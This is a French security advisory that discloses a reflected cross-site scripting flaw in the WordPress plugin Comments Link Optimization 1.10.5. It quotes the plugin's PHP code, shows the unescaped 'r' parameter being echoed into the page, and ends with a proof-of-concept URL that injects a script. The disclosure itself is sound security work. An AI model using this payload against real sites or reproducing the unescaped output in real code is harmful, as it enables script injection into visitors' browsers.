---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Comments Link Optimization"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [Comments Link Optimization](https://wordpress.org/plugins/comments-link-optimization/) (slug: `comments-link-optimization`) se présente de cette façon :

> Comments Link Optimization what prevent all search engine crawl your comments link.
> 
> Comments Link Optimization will modify link below.
> 
> Comments author link.
> Comments content link.
> Comment Optimize URL will not modify link below.
> 
> Visitors reply link. (@user)
  
La version testée est la 1.10.5 qui date d'il y a 7 ans.

## La vulnérabilité

Dans le script `comments-link-optimization.php` on trouve une classe du même nom dont le constructeur déclare une fonction d'initialisation :

```php
class CommentsLinkOptimization                                                                                         
{                                                                                                                      
                                                                                                                       
    function __construct() {                                                                                           
        add_action('init', array($this, 'init'));                                                                      
        add_filter('comment_text', array($this, 'modifyCommentText'), 99);                                             
        add_filter('get_comment_author_url', array($this, 'modifyCommentAuthorUrl'), 99);                              
    }                                                                                                                  
                                                                                                                       
    function init() {                                                                                                  
        load_plugin_textdomain( 'comments-link-optimization' );                                                        
        $this->checkRedirect();                                                                                        
    }
```

On voit qu'à l'intérieur, la méthode `checkRedirect` de la classe est appelée. Cette dernière récupère le paramètre `r` qui est normalement une URL et le passe à `printHTML` :

```php
function checkRedirect() {                                                                                             
    $redirect = isset($_GET['r']) ? $_GET['r'] : FALSE;                                                                
    if( $redirect ){                                                                                                   
        $this->printHTML(urldecode($redirect));                                                                        
        die();                                                                                                         
    }                                                                                                                  
}
```

Le code de `printHTML` est assez long, mais c'est surtout le gros bloc `echo` qui nous intéresse :

```php
function printHTML($url)                                                                                               
{                                                                                                                      
    $title = __('Redirecting', 'comments-link-optimization');                                                          
    $jumpContent = sprintf(                                                                                            
        /* translators: %s: Html tag <a> */                                                                            
        __('The page will jump to %s after 3 seconds.', 'comments-link-optimization'),                                 
        "<a href=\"$url\">$url</a>"                                                                                    
    );                                                                                                                 
                                                                                                                       
    $backContent = sprintf(                                                                                            
        /* translators: 1: The begin of html tag <a> 2: The end of html tag <a> */                                     
        __('If you do not want to visit the page, you can %1$s return to the previous page %2$s .',                    
            'comments-link-optimization'),                                                                             
        '<a href="#" onclick="return goback();">',                                                                     
        '</a>'                                                                                                         
    );                                                                                                                 
                                                                                                                       
echo <<<EOT                                                                                                            
<html>                                                                                                                 
<head>                                                                                                                 
    <meta name="robots" content="noindex, nofollow">                                                                   
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">                                                
    <title>$title</title>                                                                                              
    <style type="text/css">                                                                                            
        body,td,div,.p,a{font-family:arial,sans-serif}                                                                 
        div,td{color:#000}                                                                                             
        .f{color:#6f6f6f}                                                                                              
        a:link{color:#00c}                                                                                             
        a:visited{color:#551a8b}                                                                                       
        a:active{color:red}                                                                                            
        div.a{border-top:1px solid #bbb;border-bottom:1px solid #bbb;background:#f2f2f2;margin-top:1em;width:100%}     
        div.b{padding:0.5em 0;margin-left:10px}                                                                        
        div.c{margin-top:35px;margin-left:35px}                                                                        
    </style>                                                                                                           
    <script type="text/javascript">                                                                                    
        function goback() {window.history.go(-1);return false;}                                                        
        setTimeout(function(){window.location.href="$url";},3000);                                                     
    </script>                                                                                                          
</head>                                                                                                                
<body topmargin=3 bgcolor=#ffffff marginheight=3>                                                                      
<div class=a><div class=b><font size=+1><b>$title</b></font></div></div><div class=c>&nbsp;$jumpContent                
<br><br>&nbsp;$backContent<br><br><br></div>                                                                           
</body>                                                                                                                
</html>                                                                                                                
EOT;                                                                                                                   
}
```

On voit dans l'appel à `echo` que l'URL est affichée telle quelle dans la page sans échappement préalable d'éventuels caractères HTML.

Il s'agit donc d'une vulnérabilité XSS de type reflected.

PoC:

```
http://localhost:8000/?r=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%2Fwms9bnq9ff%2F%29%3C%2FsCrIpT%3E
```
